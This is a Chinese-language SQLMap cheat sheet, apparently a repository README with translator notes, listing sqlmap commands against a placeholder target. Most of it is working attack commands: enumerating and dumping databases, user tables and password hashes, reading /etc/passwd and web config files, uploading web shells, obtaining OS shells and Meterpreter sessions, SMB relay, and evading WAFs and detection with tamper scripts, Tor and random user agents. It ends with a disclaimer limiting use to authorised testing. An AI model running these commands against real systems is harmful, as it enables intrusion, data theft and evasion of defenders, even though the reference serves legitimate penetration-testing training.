# 💉 SQLMap 完整速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./README.tr.md) • [🇬🇷 Ελληνικά](./README.el.md)

```
   _____ ____    __    __  __           
  / ___// __ \  / /   /  |/  /___ _____ 
  \__ \/ / / / / /   / /|_/ / __ `/ __ \
 ___/ / /_/ / / /___/ /  / / /_/ / /_/ /
/____/\___\_\/_____/_/  /_/\__,_/ .___/ 
                               /_/      
    自动化 SQL 注入工具
```

<p align="center">
  <img src="https://img.shields.io/badge/SQLMap-Injection-red?style=for-the-badge" alt="SQLMap">
  <img src="https://img.shields.io/badge/SQL-Injection-orange?style=for-the-badge" alt="SQL 注入">
  <img src="https://img.shields.io/badge/Python-Tool-blue?style=for-the-badge&logo=python" alt="Python">
  <img src="https://img.shields.io/badge/Penetration-Testing-purple?style=for-the-badge" alt="渗透测试">
</p>

<p align="center">
  <b>🔥 功能强大的 SQL 注入自动化工具</b>
</p>

---

## 📋 目录

- [简介](#-introduction)
- [安装](#-installation)
- [基本语法](#-basic-syntax)
- [目标选项](#-target-options)
- [请求选项](#-request-options)
- [检测选项](#-detection-options)
- [枚举](#-enumeration)
- [数据提取](#-data-extraction)
- [文件操作](#-file-operations)
- [操作系统访问](#-os-access)
- [绕过技术](#-bypass-techniques)
- [篡改脚本（Tamper Scripts）](#-tamper-scripts)
- [实际场景示例](#-real-world-examples)
- [快速参考](#-quick-reference)
- [使用技巧与最佳实践](#-tips--best-practices)
- [资源](#-resources)

---

<a id="-introduction"></a>
## 🎯 简介

**SQLMap** 是一款开源渗透测试工具，可自动检测并利用 SQL 注入漏洞。

### 主要特性

| 特性 | 说明 |
|---------|-------------|
| **自动检测** | 自动检测 SQL 注入漏洞 |
| **数据库支持** | MySQL, PostgreSQL, MSSQL, Oracle, SQLite, 等 |
| **全面控制** | 数据库指纹识别、数据提取、操作系统访问 |
| **绕过技术** | 使用篡改脚本尝试绕过 WAF/IPS |
| **多种注入类型** | 布尔型、报错型、联合查询、堆叠查询、时间型 |

### 支持的数据库

```
✅ MySQL          ✅ PostgreSQL      ✅ Microsoft SQL Server
✅ Oracle         ✅ SQLite          ✅ IBM DB2
✅ SAP MaxDB      ✅ Firebird        ✅ Sybase
✅ HSQLDB         ✅ Informix        ✅ H2
```

### SQL 注入类型

| 类型 | 代码 | 说明 |
|------|------|-------------|
| 布尔盲注 | `B` | 依据真或假的响应差异 |
| 报错注入 | `E` | 响应中出现数据库错误 |
| 联合查询注入 | `U` | UNION SELECT 注入 |
| 堆叠查询 | `S` | 执行多条查询（;） |
| 时间盲注 | `T` | 依据响应延迟 |
| 内联查询 | `Q` | 内联（嵌套）查询 |

---

<a id="-installation"></a>
## 📥 安装

### Kali Linux（预安装）
```bash
# 更新 SQLMap
sudo apt update && sudo apt install sqlmap
```

### 从 GitHub 获取（最新版本）
```bash
# 克隆仓库
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# 运行 SQLMap
cd sqlmap-dev
python sqlmap.py --version
```

### 使用 pip
```bash
pip install sqlmap
```

### Docker
```bash
docker pull paoloo/sqlmap
docker run -it paoloo/sqlmap -u "http://target.com/page?id=1"
```

### 验证安装
```bash
sqlmap --version
sqlmap -h          # 基本帮助
sqlmap -hh         # 高级帮助
```

---

<a id="-basic-syntax"></a>
## ⌨️ 基本语法

### 通用语法
```bash
sqlmap [options] -u "URL" 
sqlmap [options] -r request.txt
```

### 快速入门示例

> **译注：** `--batch` 使用默认回答，省去交互提示；它不代表自动启用全部检测或全部后续操作。参见 [sqlmap 官方用法](https://github.com/sqlmapproject/sqlmap/wiki/Usage)。
```bash
# 基本扫描
sqlmap -u "http://target.com/page.php?id=1"

# 携带 Cookie 扫描
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# 扫描 POST 请求
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# 从文件读取目标进行扫描
sqlmap -r request.txt

# 自动模式（使用默认回答）
sqlmap -u "http://target.com/page.php?id=1" --batch
```

---

<a id="-target-options"></a>
## 🎯 目标选项

### URL 目标（-u）
```bash
# 基本 URL
sqlmap -u "http://target.com/page.php?id=1"

# 多个参数
sqlmap -u "http://target.com/page.php?id=1&cat=5"

# 指定要测试的参数
sqlmap -u "http://target.com/page.php?id=1&cat=5" -p id

# 测试所有参数（原文概括，范围见译注）
sqlmap -u "http://target.com/page.php?id=1&cat=5" --level=5
```

### 请求文件（-r）
```bash
# 将 Burp Suite 请求保存到文件
# 然后扫描：
sqlmap -r request.txt

# 请求文件示例：
# POST /login.php HTTP/1.1
# Host: target.com
# Content-Type: application/x-www-form-urlencoded
# Cookie: session=abc123
#
# username=admin&password=test
```

### Google 搜索语法（-g）
```bash
# 搜索并测试 Google 结果
sqlmap -g "inurl:page.php?id="

# 限定具体页面
sqlmap -g "inurl:product.php?id= site:target.com"
```

### 直接连接数据库（-d）
```bash
# 直接连接数据库
sqlmap -d "mysql://user:pass@target.com:3306/database"
sqlmap -d "mssql://user:pass@target.com:1433/database"
```

### 批量目标（-m）
```bash
# 包含多个 URL 的文件
sqlmap -m targets.txt

# targets.txt:
# http://target1.com/page.php?id=1
# http://target2.com/item.php?id=2
# http://target3.com/view.php?id=3
```

### 配置文件（-c）
```bash
# 使用配置文件
sqlmap -c sqlmap.conf
```

---

<a id="-request-options"></a>
## 📡 请求选项

### HTTP 方法与数据
```bash
# POST 数据
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# 指定方法
sqlmap -u "http://target.com/api/user/1" --method=PUT

# JSON 数据
sqlmap -u "http://target.com/api" --data='{"id":1}' --headers="Content-Type: application/json"
```

### Cookie
```bash
# 单个 Cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# 多个 Cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc;auth=xyz"

# 从文件加载 Cookie
sqlmap -u "http://target.com/page.php?id=1" --load-cookies=cookies.txt

# 测试 Cookie 参数
sqlmap -u "http://target.com/page.php" --cookie="id=1*" --level=2
```

### 请求头
```bash
# 自定义请求头
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1"

# 多个请求头
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1\nAccept-Language: en"

# 用户-Agent
sqlmap -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# 随机 User-Agent
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# Referer
sqlmap -u "http://target.com/page.php?id=1" --referer="http://google.com"
```

### 身份验证
```bash
# Basic 身份验证
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Basic --auth-cred="user:pass"

# Digest 身份验证
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Digest --auth-cred="user:pass"

# NTLM 身份验证
sqlmap -u "http://target.com/page.php?id=1" --auth-type=NTLM --auth-cred="domain\\user:pass"
```

### 代理
```bash
# HTTP 代理
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# SOCKS 代理
sqlmap -u "http://target.com/page.php?id=1" --proxy="socks5://127.0.0.1:9050"

# Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5

# 检查 Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --check-tor
```

---

<a id="-detection-options"></a>
## 🔍 检测选项

### 测试级别与风险

> **译注：** `--level` 扩大载荷、边界及部分请求头的测试范围，并非保证覆盖所有可能注入点。`--risk=3` 的 OR 型测试可能改变数据；原文的“安全测试”不是无副作用保证。参见 [官方 Level 与 Risk 说明](https://github.com/sqlmapproject/sqlmap/wiki/Usage#level)。
```bash
# Level（1-5）：测试范围与数量
sqlmap -u "http://target.com/page.php?id=1" --level=3

# Risk（1-3）：测试风险
sqlmap -u "http://target.com/page.php?id=1" --risk=2

# 原文建议用于深入测试（风险区别见译注）
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
```

| 级别 | 测试内容 |
|-------|-------|
| 1 | 默认：基本测试 |
| 2 | 增加 Cookie 测试 |
| 3 | 增加 User-Agent、Referer 测试 |
| 4 | 增加更多载荷 |
| 5 | 原文概括为全部载荷 |

| 风险 | 说明 |
|------|-------------|
| 1 | 默认：原文称为安全测试（并非无副作用保证） |
| 2 | 增加较重的时间型测试 |
| 3 | 增加基于 OR 的测试（可能修改数据！） |

### 选择注入技术
```bash
# 指定技术
sqlmap -u "http://target.com/page.php?id=1" --technique=U    # 仅联合查询
sqlmap -u "http://target.com/page.php?id=1" --technique=B    # 仅布尔型
sqlmap -u "http://target.com/page.php?id=1" --technique=E    # 仅报错型
sqlmap -u "http://target.com/page.php?id=1" --technique=T    # 仅时间型
sqlmap -u "http://target.com/page.php?id=1" --technique=S    # 仅堆叠查询

# 多种技术
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU

# 所有技术（默认）
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ
```

### 时间延迟
```bash
# 时间型注入的延迟秒数（默认：5）
sqlmap -u "http://target.com/page.php?id=1" --time-sec=10

# 请求之间的延迟
sqlmap -u "http://target.com/page.php?id=1" --delay=2
```

### 线程
```bash
# 并发连接数（默认：1）
sqlmap -u "http://target.com/page.php?id=1" --threads=10
```

---

<a id="-enumeration"></a>
## 📊 枚举

### 数据库枚举
```bash
# 获取当前数据库
sqlmap -u "http://target.com/page.php?id=1" --current-db

# 获取当前用户
sqlmap -u "http://target.com/page.php?id=1" --current-user

# 检查用户是否为 DBA
sqlmap -u "http://target.com/page.php?id=1" --is-dba

# 列出所有数据库
sqlmap -u "http://target.com/page.php?id=1" --dbs

# 列出所有用户
sqlmap -u "http://target.com/page.php?id=1" --users

# 列出用户密码信息
sqlmap -u "http://target.com/page.php?id=1" --passwords

# 列出权限
sqlmap -u "http://target.com/page.php?id=1" --privileges

# 列出角色
sqlmap -u "http://target.com/page.php?id=1" --roles
```

### 表枚举
```bash
# 列出数据库中的表
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# 列出所有表
sqlmap -u "http://target.com/page.php?id=1" --tables

# 统计表记录数
sqlmap -u "http://target.com/page.php?id=1" -D database_name --count
```

### 列枚举
```bash
# 列出表中的列
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# 搜索列名
sqlmap -u "http://target.com/page.php?id=1" --search -C password
sqlmap -u "http://target.com/page.php?id=1" --search -C email,user
```

### 导出数据库结构
```bash
# 导出数据库结构
sqlmap -u "http://target.com/page.php?id=1" --schema

# 排除系统数据库
sqlmap -u "http://target.com/page.php?id=1" --schema --exclude-sysdbs
```

---

<a id="-data-extraction"></a>
## 📤 数据提取

### 导出数据
```bash
# 导出指定表
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump

# 导出指定列
sqlmap -u "http://target.com/page.php?id=1" -D database -T users -C username,password --dump

# 导出数据库中的所有表
sqlmap -u "http://target.com/page.php?id=1" -D database --dump-all

# 导出所有数据
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# 排除系统数据库
sqlmap -u "http://target.com/page.php?id=1" --dump-all --exclude-sysdbs
```

### 限制结果范围
```bash
# 前 10 行
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=1 --stop=10

# 第 5-15 行
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=5 --stop=15

# WHERE 子句
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --where="admin=1"
```

### 自定义 SQL 查询
```bash
# 执行 SQL 查询
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT version()"

# 交互式 SQL Shell
sqlmap -u "http://target.com/page.php?id=1" --sql-shell
```

### 输出格式

> **译注（原文错误）：** “保存为 HTML”的命令只设置 `--output-dir`，不会选择 HTML 格式。格式由 `--dump-format` 控制，默认是 CSV。此处保留原命令并标明差异；参见 [官方导出格式说明](https://github.com/sqlmapproject/sqlmap/wiki/Usage#format-of-dumped-data)。
```bash
# 保存为 CSV
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --csv-del=","

# 原文标为保存为 HTML（此命令仅设置目录，见译注）
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --output-dir=/tmp/output
```

---

<a id="-file-operations"></a>
## 📁 文件操作

### 读取文件
```bash
# 从服务器读取文件
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# 读取 Windows 文件
sqlmap -u "http://target.com/page.php?id=1" --file-read="C:/Windows/System32/drivers/etc/hosts"

# 读取 Web 配置
sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/www/html/config.php"
```

### 写入文件
```bash
# 向服务器写入文件
sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php"

# 上传 Web Shell
sqlmap -u "http://target.com/page.php?id=1" --file-write="./webshell.php" --file-dest="/var/www/html/cmd.php"
```

---

<a id="-os-access"></a>
## 💻 操作系统访问

> **适用范围：** 文件读写、操作系统命令执行、Meterpreter 及注册表功能依赖具体 DBMS、权限和环境，不是发现任意 SQL 注入后都能实现。参见 [官方用法文档](https://github.com/sqlmapproject/sqlmap/wiki/Usage)。

### 命令执行
```bash
# 执行操作系统命令
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"

# 交互式 Shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# Windows 上的 PowerShell
sqlmap -u "http://target.com/page.php?id=1" --os-shell --os-cmd="powershell"
```

### Meterpreter 会话
```bash
# 获取 Meterpreter 会话
sqlmap -u "http://target.com/page.php?id=1" --os-pwn

# 使用指定选项
sqlmap -u "http://target.com/page.php?id=1" --os-pwn --msf-path=/opt/metasploit
```

### SMB 中继
```bash
# SMB 中继攻击
sqlmap -u "http://target.com/page.php?id=1" --os-smbrelay
```

### 注册表访问（Windows）

> **译注（原文拼写）：** 读取示例中的 `-reg-key` 少了一个前导连字符；官方参数是 `--reg-key`。下方代码仍保留原文，参见 [官方参数定义](https://github.com/sqlmapproject/sqlmap/blob/master/lib/parse/cmdline.py)。
```bash
# 读取注册表
sqlmap -u "http://target.com/page.php?id=1" --reg-read -reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft"

# 添加注册表项
sqlmap -u "http://target.com/page.php?id=1" --reg-add --reg-key="..." --reg-value="..." --reg-data="..." --reg-type=REG_SZ

# 删除注册表项
sqlmap -u "http://target.com/page.php?id=1" --reg-del --reg-key="..." --reg-value="..."
```

---

<a id="-bypass-techniques"></a>
## 🛡️ 绕过技术

### WAF/IPS 绕过

> **版本说明：** `--identify-waf` 已被列为过时选项，官方注明相关识别会自动进行，参见 [官方选项兼容表](https://github.com/sqlmapproject/sqlmap/blob/master/lib/core/dicts.py)。Tamper 表是简略描述，脚本适用性取决于数据库与请求解析方式；使用它们、随机 User-Agent 或 Tor 均不能保证绕过防护或避免检测。
```bash
# 识别 WAF
sqlmap -u "http://target.com/page.php?id=1" --identify-waf

# 跳过 WAF 检测
sqlmap -u "http://target.com/page.php?id=1" --skip-waf

# 随机大小写
sqlmap -u "http://target.com/page.php?id=1" --tamper=randomcase

# 多个篡改脚本
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase,between
```

<a id="-tamper-scripts"></a>
### 常用篡改脚本
```bash
# URL 编码
--tamper=charencode

# 双重 URL 编码
--tamper=chardoubleencode

# Unicode 编码
--tamper=charunicodeencode

# 将空格替换为注释
--tamper=space2comment
--tamper=space2hash
--tamper=space2morehash

# 大小写变换
--tamper=randomcase
--tamper=lowercase
--tamper=uppercase

# 替换关键字
--tamper=between
--tamper=equaltolike
```

### 篡改脚本参考

| 脚本 | 说明 |
|--------|-------------|
| `apostrophemask` | 将单引号替换为 UTF-8 编码形式 |
| `apostrophenullencode` | 将单引号替换为原文所述的双重 Unicode 形式 |
| `base64encode` | 对载荷进行 Base64 编码 |
| `between` | 替换 `>` 为 `NOT BETWEEN 0 AND #` |
| `charencode` | 对所有字符进行 URL 编码 |
| `charunicodeencode` | Unicode-URL 编码 |
| `concat2concatws` | 替换 `CONCAT` 为 `CONCAT_WS` |
| `equaltolike` | 替换 `=` 为 `LIKE` |
| `greatest` | 替换 `>` 为 `GREATEST` |
| `halfversionedmorekeywords` | 添加带版本号的 MySQL 注释 |
| `ifnull2ifisnull` | 替换 `IFNULL` 为 `IF(ISNULL())` |
| `lowercase` | 将关键字转换为小写 |
| `modsecurityversioned` | 使用带版本号的注释尝试绕过 ModSecurity |
| `modsecurityzeroversioned` | 使用零版本号注释尝试绕过 ModSecurity |
| `percentage` | 在字符前添加百分号 |
| `randomcase` | 随机化关键字大小写 |
| `randomcomments` | 在 SQL 关键字中添加随机注释 |
| `securesphere` | 追加特定字符串，尝试绕过 SecureSphere |
| `space2comment` | 将空格替换为 `/**/` |
| `space2dash` | 将空格替换为双连字符注释 `--` |
| `space2hash` | 将空格替换为 `#` 注释 |
| `space2morehash` | 将空格替换为 `#` 并添加换行 |
| `space2mssqlblank` | 将空格替换为 MSSQL 空白字符 |
| `space2mssqlhash` | 将空格替换为 `#` 并添加换行 (MSSQL) |
| `space2plus` | 将空格替换为 `+` |
| `space2randomblank` | 将空格替换为随机空白字符 |
| `symboliclogical` | 替换 `AND`/`OR` 为 `&&`/`||` |
| `unionalltounion` | 替换 `UNION ALL` 为 `UNION` |
| `unmagicquotes` | 将引号替换为多字节形式 `%bf%27` |
| `uppercase` | 将关键字转换为大写 |
| `versionedkeywords` | 使用带版本号的注释包围关键字 |
| `versionedmorekeywords` | 使用带版本号的注释包围更多关键字 |
| `xforwardedfor` | 添加伪造的 `X-Forwarded-For` 请求头 |

---

<a id="-real-world-examples"></a>
## 🎬 实际场景示例

### 示例 1：基本扫描
```bash
# 使用自动模式扫描
sqlmap -u "http://target.com/products.php?id=1" --batch --banner
```

### 示例 2：完整数据库导出
```bash
# 枚举并导出
sqlmap -u "http://target.com/page.php?id=1" \
    --dbs \
    --batch

# 找到数据库后
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    --tables \
    --batch

# 导出 users 表
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    -T users \
    --dump \
    --batch
```

### 示例 3：携带 Cookie 的 POST 请求
```bash
sqlmap -u "http://target.com/login.php" \
    --data="username=admin&password=test" \
    --cookie="PHPSESSID=abc123" \
    --level=3 \
    --risk=2 \
    --batch
```

### 示例 4：经由 Burp 代理
```bash
# 将 Burp 请求保存到文件，然后：
sqlmap -r request.txt \
    --proxy="http://127.0.0.1:8080" \
    --batch
```

### 示例 5：WAF 绕过
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --tamper=space2comment,randomcase,between \
    --random-agent \
    --level=3 \
    --risk=2 \
    --batch
```

### 示例 6：获取操作系统 Shell
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --os-shell \
    --batch
```

### 示例 7：读取敏感文件
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --file-read="/etc/passwd" \
    --batch
```

---

<a id="-quick-reference"></a>
## 📊 快速参考

### 核心命令

| 命令 | 说明 |
|---------|-------------|
| `-u URL` | 带参数的目标 URL |
| `-r FILE` | 从文件加载请求 |
| `--data=DATA` | POST 数据 |
| `--cookie=COOKIE` | HTTP Cookie |
| `--dbs` | 列出数据库 |
| `--tables` | 列出表 |
| `--columns` | 列出列 |
| `--dump` | 导出数据 |
| `-D DB` | 指定数据库 |
| `-T TABLE` | 指定表 |
| `-C COLS` | 指定列 |
| `--batch` | 非交互模式 |

### 检测选项

| 选项 | 说明 |
|--------|-------------|
| `--level=LEVEL` | 测试级别（1-5） |
| `--risk=RISK` | 风险级别（1-3） |
| `-p PARAM` | 要测试的参数 |
| `--technique=TECH` | 注入技术 |
| `--threads=N` | 并发线程数 |

### 输出选项

| 选项 | 说明 |
|--------|-------------|
| `-v LEVEL` | 输出详细程度（0-6） |
| `--batch` | 不询问输入，采用默认回答 |
| `--flush-session` | 清除会话缓存 |
| `--output-dir=DIR` | 自定义输出目录 |

---

<a id="-tips--best-practices"></a>
## 💡 使用技巧与最佳实践

### 性能建议

1. **从简单配置开始**
   ```bash
   # 从较低测试级别开始
   sqlmap -u "URL" --level=1 --batch
   # 按需提高
   ```

2. **使用 --batch 进行自动化**
   ```bash
   sqlmap -u "URL" --batch --dbs
   ```

3. **通过指定测试节省时间**
   ```bash
   # 仅测试联合查询注入
   sqlmap -u "URL" --technique=U
   ```

### 隐蔽性建议

1. **随机 User-Agent**
   ```bash
   sqlmap -u "URL" --random-agent
   ```

2. **增加延迟**
   ```bash
   sqlmap -u "URL" --delay=2
   ```

3. **使用 Tor**
   ```bash
   sqlmap -u "URL" --tor --check-tor
   ```

### 故障排查

| 问题 | 解决方法 |
|-------|----------|
| 未发现注入 | 提高 `--level` and `--risk` |
| WAF 拦截 | 使用 `--tamper` 脚本 |
| 扫描缓慢 | 降低 `--level`, 使用指定的 `--technique` |
| 连接问题 | 检查 `--timeout`, `--retries` |

---

## ⚠️ 法律免责声明

> **警告：** SQLMap 是功能强大的工具，仅可用于 **获得授权的测试**.
> 
> - ✅ 测试您拥有的系统
> - ✅ 获得明确书面许可后测试
> - ✅ 用于合法的渗透测试项目
> - ❌ 未经授权不得对系统使用
> - ❌ 不得用于恶意目的
> 
> **未经授权访问计算机系统属于违法行为，可能受到法律处罚。**

---

<a id="-resources"></a>
## 📚 资源

### 官方资源
- [SQLMap 官方网站](https://sqlmap.org/)
- [SQLMap GitHub 仓库](https://github.com/sqlmapproject/sqlmap)
- [SQLMap Wiki 文档](https://github.com/sqlmapproject/sqlmap/wiki)

### 学习资源
- [OWASP SQL 注入](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL 注入资料](https://portswigger.net/web-security/sql-injection)

### 相关速查表
- [Metasploit Framework](../../Metasploit/README.md)
- [Meterpreter](../../Metasploit/Meterpreter.md)

---

<p align="center">
  <b>💉 掌握 SQL 注入测试！</b><br>
  <i>能力越大，责任越大</i>
</p>
